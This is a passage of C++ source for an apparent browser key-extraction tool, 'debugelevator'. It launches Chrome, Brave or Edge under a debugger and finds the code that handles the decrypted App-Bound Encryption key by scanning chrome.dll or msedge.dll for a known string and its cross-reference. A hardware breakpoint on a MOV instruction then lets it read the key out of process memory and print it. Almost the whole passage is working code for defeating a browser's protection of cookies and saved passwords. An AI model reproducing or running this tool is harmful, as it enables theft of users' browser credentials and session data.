						}
						case ZYDIS_REGISTER_R15:
						{
							p_addr = reinterpret_cast<LPVOID>(ctx.R15);
							break;
						}
						}

						LPVOID addr = NULL;
						SIZE_T bytesRead = NULL;
						BOOL rpmOk = ReadProcessMemory(
							pi.hProcess,
							p_addr,
							&addr,
							sizeof(uintptr_t),
							&bytesRead
						);

						if (rpmOk) {
							bytesRead = NULL;
							rpmOk = ReadProcessMemory(
								pi.hProcess,
								addr,
								args->result.data(),
								args->result.size(),
								&bytesRead
							);

							if (rpmOk)
							{
								// Clear temporary DR0 breakpoint before terminating.
								ctx.Dr0 = 0;

								// Clear local/global enable bits for DR0.
								ctx.Dr7 &= ~0x3ull;

								// Clear RW0/LEN0 fields.
								ctx.Dr7 &= ~(0xfull << 16);

								ctx.Dr6 = 0;
								ctx.EFlags &= ~EFLAGS_TF;
								ctx.EFlags &= ~EFLAGS_RF;

								WriteThreadContext(bp.hThread, ctx);
								TerminateProcess(pi.hProcess, 0);

								continueStatus = DBG_CONTINUE;
								return 0;
							}
						}

						continueStatus = DBG_EXCEPTION_HANDLED;
					}
					continueStatus = DBG_CONTINUE;
				}
				else {
					continueStatus = DBG_EXCEPTION_NOT_HANDLED;
				}
			}
			break;
		}

		case EXIT_PROCESS_DEBUG_EVENT:
		{
			continueStatus = DBG_CONTINUE;
			shouldExitDebugger = true;
			break;
		}

		case EXIT_THREAD_DEBUG_EVENT:
		{
			auto it = targetDll.breakpoints.find(de.dwThreadId);
			if (it != targetDll.breakpoints.end())
			{
				if (it->second.hThread)
					CloseHandle(it->second.hThread);

				targetDll.breakpoints.erase(it);
			}

			continueStatus = DBG_CONTINUE;
			break;
		}

		default:
			break;
		}

		if (!ContinueDebugEvent(de.dwProcessId, de.dwThreadId, continueStatus))
		{
			break;
		}
	}

	return 1;
}

std::optional<uintptr_t> GetChromiumInstruction(
	const fs::path& path,
	std::wstring& outTargetDll
) {
	MappedImageView image;
	if (!fs::exists(path)) {
		return std::nullopt;
	}

	auto version_opt = FindChromeVersionFolder(path);
	if (version_opt.has_value()) {
		auto version_path = version_opt.value();
		auto filename = path.filename();

		if (filename.compare("chrome.exe") == 0 || 
			filename.compare("brave.exe") == 0) {
			outTargetDll = L"chrome.dll";
		}
		else if (filename.compare("msedge.exe") == 0) {
			outTargetDll = L"msedge.dll";
		}
		else {
			return std::nullopt;
		}

		std::wcout << "[*] The target DLL is: " << outTargetDll << std::endl;
		fs::path fileToMap = version_path / outTargetDll;
		if (MapImage(fileToMap, image)) { // Map target chromium dll onto memory so we can parse it
			PESection rdata = {};
			PESection text = {};
			if (GetPESection(image.Base, ".rdata", rdata) && // find pe file .rdata & .text section
				GetPESection(image.Base, ".text", text)) {
				MemoryMatch match = {};

				// this string is referenced only once in the entire chromium codebase when its has jus finished decryptying app bound encryption key
				if (FindBytesInSection(rdata, "OSCrypt.AppBoundProvider.Decrypt.ResultCode", match)) {

					// now, we just need then to find a xref to this string in .text section, nearby where it decrypts the key
					std::vector<XrefInfo> xrefs;
					if (FindXrefInSection(text, match.Address, xrefs)) {
						KeyMovInsnResult mov = {};

						std::cout << "[+] Found XREF at: " << std::hex << xrefs[0].InstructionAddress << std::endl;

						// once found, we walk there, because, a few instructions ahead there is this isns: mov rdx, r14|r15 which is responsible for moving
						// decrypted key pointer around
						if (FindChromiumMovKeyInstruction(
							text,
							reinterpret_cast<void*>(xrefs.at(0).InstructionAddress),
							&mov
						)) {
							std::cout << "[+] Found target MOV RDX, (R14|R15) instruction at " << std::hex << mov.movInstruction << std::endl;

							// we get its offset relative to the loaded image base address because of ASLR
							return reinterpret_cast<uintptr_t>(mov.movInstruction) - reinterpret_cast<uintptr_t>(image.Base);
						}
					}
				}
			}
		}
		return std::nullopt;
	}
}

int wmain(int argc, wchar_t** argv)
{
	PrintBanner(DebugStatus::DebuggerAttached);

	if (argc < 2) {
		std::cout << R"usage(
Leverage debugging to extract app bound encryption key
v1.0.0 by @rablidad

Usage:
  debugelevator.exe "C:\Program Files\Google\Chrome\Application\chrome.exe"

)usage";
		return 1;
	}

	DebugSetProcessKillOnExit(TRUE);

	std::wstring targetDll;
	fs::path exePath = argv[1];
	auto offset_opt = GetChromiumInstruction(exePath, targetDll);
	if (offset_opt.has_value()) {
		DebugArgs args;
		args.target = exePath.wstring();
		args.result = std::vector<uint8_t>(APPBOUND_KEY_SIZE);
		args.breakpointOffset = offset_opt.value();
		args.targetDll = targetDll;

		KillProcessesByName(exePath.filename());
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DebugLoop, &args, 0, NULL);
		if (hThread) {
			DWORD waitResult = WaitForSingleObject(hThread, DEBUG_LOOP_TIMEOUT);
			DWORD result = 0;
			if (waitResult == WAIT_OBJECT_0 && GetExitCodeThread(hThread, &result)) {
				if (result == 0) {
					std::cout << "[+] KEY: ";
					for (int i = 0; i < args.result.size(); i++) {
						printf("%02X", args.result.at(i));
					}
					printf("\n");
				}
			}
		}
	}
	else {

	}

	return 0;
}
